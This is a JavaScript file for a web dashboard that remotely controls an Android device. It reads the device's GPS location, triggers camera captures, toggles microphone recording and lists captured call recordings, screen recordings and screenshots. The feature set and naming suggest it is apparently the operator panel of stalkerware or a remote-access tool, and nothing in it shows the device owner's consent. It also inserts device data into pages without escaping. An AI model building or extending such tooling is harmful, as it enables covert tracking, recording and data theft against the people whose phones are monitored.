// Device dashboard page — status, location, camera, mic, info
let deviceKey = "";
(async function() {
    const parts = window.location.pathname.split("/");
    deviceKey = decodeURIComponent(parts[parts.length - 1]);
    document.getElementById("deviceTitle").textContent = "DEVICE: " + deviceKey;
    await loadStatus();
    loadCameras();
    loadMedia();
    loadNickname();
})();

function getHostPort() {
    const [host, port] = deviceKey.split(":");
    return { host, port: parseInt(port) || 8443 };
}

async function api(path, options = {}) {
    const res = await fetch(path, {
        headers: { "Content-Type": "application/json" },
        ...options,
    });
    if (res.status === 401) {
        window.location.href = "/";
        return null;
    }
    return res.json();
}

// Status
async function loadStatus() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/health`);
    if (!data) return;
    const online = data.status === "ok";
    const val = document.getElementById("statusOnlineValue");
    const icon = document.getElementById("statusOnlineIcon");
    if (val) {
        val.textContent = online ? "ONLINE" : "OFFLINE";
        // Offline devices render in black (per spec) — green only when live.
        val.className = "font-headline text-2xl font-bold value " + (online ? "text-maquis-green" : "text-black");
    }
    if (icon) {
        icon.className = "material-symbols-outlined " + (online ? "text-maquis-green animate-pulse" : "text-black");
    }
    setVal("#statusUptime .value",
        data.uptimeSeconds ? fmtUptime(data.uptimeSeconds) : "—");
    setVal("#statusNetwork .value", `${host}:${port}`);
    if (data.deviceName) {
        document.getElementById("deviceTitle").textContent = "DEVICE: " + data.deviceName;
    }
}

function setVal(sel, text) {
    const el = document.querySelector(sel);
    if (el) el.textContent = text;
}

function fmtUptime(s) {
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60;
    return `${h}h ${m}m ${sec}s`;
}

// Device Info
async function loadDeviceInfo() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/info`);
    if (!data) return;
    const box = document.getElementById("deviceInfoData");
    const fields = [
        ["Model", data.model], ["Manufacturer", data.manufacturer],
        ["Android", data.androidVersion], ["Build", data.buildId],
        ["Device", data.deviceId], ["Screen", data.screen],
        ["IP", `${host}:${port}`],
    ];
    box.innerHTML = fields
        .filter(([, v]) => v)
        .map(([k, v]) => `<div class="data-row"><span>${k}</span><span>${v}</span></div>`)
        .join("");
}

// Location
async function getLocation() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/location`);
    if (!data) return;
    const box = document.getElementById("locationData");
    const coords = document.getElementById("locationCoords");
    if (data.latitude && data.longitude) {
        coords.innerHTML =
            `<span>LAT: ${data.latitude.toFixed(4)}</span><span class="text-moon-silver/30">|</span><span>LON: ${data.longitude.toFixed(4)}</span>`;
        box.textContent = `FIX_ACQUIRED: ${new Date(data.timestamp || Date.now()).toLocaleTimeString()}`;
    } else {
        box.textContent = data.error === "no_location" ? "NO_GPS_FIX" : JSON.stringify(data);
    }
}

// Camera
async function loadCameras() {
    const { host, port } = getHostPort();
    const data = await api(`/api/device/${host}/${port}/cameras`);
    if (!data) return;
    const list = document.getElementById("cameraList");
    const cameras = data.cameras || [];
    if (!cameras.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">videocam_off</span>
            <span class="font-label text-sm text-on-surface/60">NO_SENSORS</span></div>`;
        return;
    }
    list.innerHTML = cameras.map((c, i) => `
        <label class="flex items-center gap-3 p-3 border border-moon-silver/20 rounded cursor-pointer hover:bg-surface-container transition-colors">
            <input type="radio" name="camera_sensor" value="${c.id ?? i}" class="text-hunt-crimson bg-void-black border-moon-silver/30 focus:ring-hunt-crimson focus:ring-offset-void-black">
            <span class="font-label text-sm text-on-surface">${c.name || ("CAM_" + (c.id ?? i))}</span>
        </label>`).join("");
}

async function capturePhoto() {
    const { host, port } = getHostPort();
    const sel = document.querySelector('input[name="camera_sensor"]:checked');
    const cameraId = sel ? sel.value : "0";
    const data = await api(`/api/device/${host}/${port}/camera/capture?camera_id=${cameraId}`,
        { method: "POST", body: JSON.stringify({}) });
    if (!data) return;
    const box = document.getElementById("cameraData");
    box.classList.remove("hidden");
    box.innerHTML = `<div class="font-label text-xs text-maquis-green tracking-widest uppercase">CAPTURE_${data.status === "ok" ? "OK" : "FAILED"}</div>`;
}

// Mic toggle
let micRecording = false;
async function toggleMic() {
    micRecording = !micRecording;
    const btn = document.getElementById("micBtn");
    const box = document.getElementById("micData");
    btn.innerHTML = micRecording
        ? `<span class="material-symbols-outlined text-sm">stop</span> STOP`
        : `<span class="material-symbols-outlined text-sm">fiber_manual_record</span> START`;
    btn.classList.toggle("border-hunt-crimson", micRecording);
    btn.classList.toggle("text-hunt-crimson", micRecording);
    box.textContent = micRecording ? "● RECORDING — 00:00" : "STANDBY";
    if (micRecording) {
        window._micTimer = setInterval(() => {
            const el = document.getElementById("micData");
            const m = Math.floor((Date.now() - window._micStart) / 60000);
            const s = Math.floor((Date.now() - window._micStart) / 1000) % 60;
            el.textContent = `● RECORDING — ${String(m).padStart(2,"0")}:${String(s).padStart(2,"0")}`;
        }, 1000);
        window._micStart = Date.now();
    } else {
        clearInterval(window._micTimer);
        box.textContent = `STOPPED — ${Math.floor((Date.now() - window._micStart) / 1000)}s`;
    }
}

// Refresh all
async function refreshDevice() {
    await loadStatus();
    await loadDeviceInfo();
    await loadMedia();
}

// ---------------------------------------------------------------------------
// Captured media (call recordings, videos, screen recordings, screenshots)
// + device nickname — all served from the local encrypted DB, phone offline OK
// ---------------------------------------------------------------------------

const MEDIA_META = {
    call_recording:  { icon: "call",              label: "CALL RECORDING" },
    video:           { icon: "movie",             label: "VIDEO" },
    screen_recording:{ icon: "smart_display",     label: "SCREEN RECORDING" },
    screenshot:      { icon: "screenshot_monitor",label: "SCREENSHOT" },
    photo:           { icon: "photo_camera",      label: "PHOTO" },
};

function fmtSize(b) {
    if (!b) return "";
    if (b < 1024) return `${b} B`;
    if (b < 1048576) return `${(b / 1024).toFixed(1)} KB`;
    return `${(b / 1048576).toFixed(1)} MB`;
}

function fmtDur(s) {
    if (!s) return "";
    const m = Math.floor(s / 60), sec = Math.floor(s % 60);
    return `${m}m ${sec.toString().padStart(2, "0")}s`;
}

async function loadMedia() {
    const { host, port } = getHostPort();
    const list = document.getElementById("mediaList");
    const data = await api(`/api/device/${host}/${port}/media`);
    if (!data) return;
    const items = data.media || [];
    if (!items.length) {
        list.innerHTML = `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded opacity-50">
            <span class="material-symbols-outlined text-sm text-moon-silver/60">collections</span>
            <span class="font-label text-sm text-on-surface/60">NO_CAPTURES</span></div>`;
        return;
    }
    list.innerHTML = items.map(m => {
        const meta = MEDIA_META[m.kind] || { icon: "folder", label: m.kind };
        const metaLine = [fmtSize(m.size_bytes), fmtDur(m.duration_sec)].filter(Boolean).join(" · ");
        return `<div class="flex items-center gap-3 p-3 border border-moon-silver/10 rounded">
            <span class="material-symbols-outlined text-sm text-pyrenees-frost">${meta.icon}</span>
            <div class="flex-1 min-w-0">
                <div class="font-label text-sm text-on-surface truncate">${meta.label}</div>
                <div class="font-label text-[10px] text-moon-silver/50 truncate">${m.path || "—"}${metaLine ? " · " + metaLine : ""} · ${new Date((m.captured_at || Date.now()) * 1000).toLocaleString()}</div>
            </div>
            <button onclick="deleteMedia(${m.id})" title="Delete entry" class="text-moon-silver/40 hover:text-error transition-colors p-1">
                <span class="material-symbols-outlined text-sm">delete</span>
            </button>
        </div>`;
    }).join("");
}

async function deleteMedia(id) {
    const { host, port } = getHostPort();
    if (!confirm("Delete this media entry from the catalogue?")) return;
    await api(`/api/device/${host}/${port}/media/${id}`, { method: "DELETE" });
    loadMedia();
}

async function saveNickname() {
    const { host, port } = getHostPort();
    const input = document.getElementById("nicknameInput");
    const nick = input.value.trim();
    if (!nick) return;
    await api(`/api/device/${host}/${port}/nickname`,
        { method: "POST", body: JSON.stringify({ nickname: nick }) });
    document.getElementById("deviceTitle").textContent = "DEVICE: " + nick;
    input.blur();
}

async function loadNickname() {
    const { host, port } = getHostPort();
    const devs = await api("/api/devices");
    if (!devs) return;
    const dev = devs[`${host}:${port}`];
    if (dev && dev.nickname) {
        document.getElementById("nicknameInput").value = dev.nickname;
    }
}
